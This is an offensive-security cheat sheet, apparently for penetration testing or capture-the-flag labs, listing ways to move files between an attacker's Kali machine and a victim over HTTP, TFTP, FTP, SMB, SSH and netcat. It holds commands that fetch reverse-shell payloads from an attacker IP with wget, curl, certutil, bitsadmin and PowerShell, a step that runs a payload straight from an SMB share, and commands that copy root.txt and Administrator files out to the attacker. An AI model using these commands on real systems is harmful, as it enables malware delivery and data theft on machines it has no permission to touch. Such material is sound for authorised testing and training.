# Transfering files
## HTTP

### Method 1

#### Sender

`python3 -m http.server 8000`
`python -m SimpleHTTPServer`

#### Receiver
##### Linux
`wget http://10.10.10.79:8000/rev_shell.sh -O /tmp/rev_shell.sh` <br>
`curl http://10.10.10.79:8000/rev_shell.sh -o /tmp/rev_shell.sh` <br>

##### Windows
`curl http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe` <br>
You need to mention the -o (-OutFile) flag in order to save the file. If we do not mention the flag then it will only return it as an object i.e., WebResponseObject. <br>
`certutil -urlcache -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe` <br>
`certutil -urlcache -split -f http://10.10.10.79:8000/rev_shell.exe rev_shell.exe` <br>
(The -split option in certutil is used to split large files into smaller segments to perform the file transfer.) <br>
`bitsadmin /transfer job ttp://10.10.10.79:8000/rev_shell.exe C:\Users\Public\rev_shell.exe` <br>
Bitsadmin is a command-line utility for handling Background Intelligent Transfer Service (BITS) tasks in Windows. It facilitates different file transfer operations, including downloading and uploading files.  <br>
`powershell wget http://10.10.10.79:8000/rev_shell.exe -o rev_shell.exe`
`powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.10.79:8000/rev_shell.exe', 'rev_shell.exe')`
instantly execute it:
``

### Method 2

#### Sender

`curl -T root.txt http://10.10.10.79:8080`

`curl -X PUT --data-binary@"C:\Users\Administrator\Desktop\root.txt" http://10.10.10.79:8080/root.txt`

#### Receiver

python3 -m SimpleHTTPPutServer 8080

[SimpleHTTPPutServer.py](https://gist.github.com/fabiand/5628006)

```
# python3 -m SimpleHTTPPutServer 8080

from http.server import HTTPServer, SimpleHTTPRequestHandler

class PutHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_PUT(self):
        print(self.headers)
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))
        self.send_response(200)
        self.end_headers()


def run(server_class=HTTPServer, handler_class=PutHTTPRequestHandler):
    server_address = ('', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()

if __name__ == '__main__':
    run()
```

Or

`python3 webserver.py

webserver.py
```
from flask import Flask, request
import os

app=Flask(__name__)

@app.route('/root.txt', methods=['PUT'])
def upload_file():
    file=request.data
    with open('root.txt','wb') as f:
        f.write(file)
    return "File Uploaded successfully", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080)

```


## TFTP

TFTP (Trivial File Transfer Protocol)	TFTP uses UDP for simple file transfers, commonly used by older Windows systems and others.

Use metaspoit framework:
```
use auxiliary/server/tftp
set srvhost 192.168.31.141
set tftproot /root/raj
run
```

```
tftp -i 192.168.31.219 GET ignite.txt
dir
```

## FTP

Use metasploit framework:
```
msfconsole -q
use auxiliary/server/ftp
set srvhost 192.168.31.141
set ftproot /root/raj
set ftpuser raj
set ftppass 123
run
```

```
ftp 192.168.31.141
dir
get ignite.txt
```

`python3 -m pyftpdlib -w -p 21 -u ignite -P 123`

```
ftp 192.168.31.141
get ignite.txt
put C:\Users\raj\avni.txt
```

or:
`wget ftp://<kali_IP>:<Port_number>/<file> (-O /path/to/dir/<file>)`

## SMB

### Bi-directional

```
impacket-smbclient "$user:$pass@$ip"
use Shared
put rev_shell.exe
get secret.txt
```

```
smbclient -L 192.168.31.141
smbclient "\\\\192.168.31.141\share"
ls
get ignite.txt
put data.txt
```

#### Sender
`impacket-smbserver share .` <br>
`impacket-smbserver share $(pwd) -smb2support -username smbuser -password smbpass` <br>
Sometimes it is not allowed to connect to shares without authentication.

#### Receiver

```
net use \\10.10.10.45\share /user:smbuser
smbpass
```

`copy ignite.txt \\192.168.31.141\share\ignite.txt`

to instantly execute it: `powershell -c (\\<kali_IP\<server_name>\<payload)`

or just copy: `copy \\192.168.31.141\share\ignite.txt`

`copy C:\Users\Administrator\Desktop\root.txt \\10.10.10.79\share\`

Kali -> Victim

| Kali    | Windows Victim PowerShell |
| -------- | ------- |
| impacket-smbserver <server_name> .  | to instantly execute it: powershell -c (\\<kali_IP\<server_name>\<payload) |

impacket-smbserver <server_name> .

## SSH

### Sender

`scp secret.txt kali@10.10.10.79:/path/to/dir`
`scp ./hash.txt kracken@192.168.0.45:"C:\\Users\\kracken\\Desktop\\hacking\\hashes\\hash.txt"`

### Receiver

`scp kracken@192.168.0.45:"/C:/Users/kracken/Desktop/crack" .`

## NetCat

receiver:
`nc -lvp 5555 > file.txt`
and then sender:
`nc 192.168.31.141 5555 < file.txt`
`nc -w 3 [destination] <Port_number> < <file_name>`

On Windows:
`nc.exe 192.168.31.141 5555 < data.txt`
`nc -lvp 5555 > data.txt`



Useful notes:
- On Linux receiving: worth using /tmp directory, as it is globally readable, writeable and executable.
- On Windows the C:\Users\Public\ directory is accessible to all users on a Windows system.
- Upgrade your shell if possible.
- If one method doesn't work, try another one.
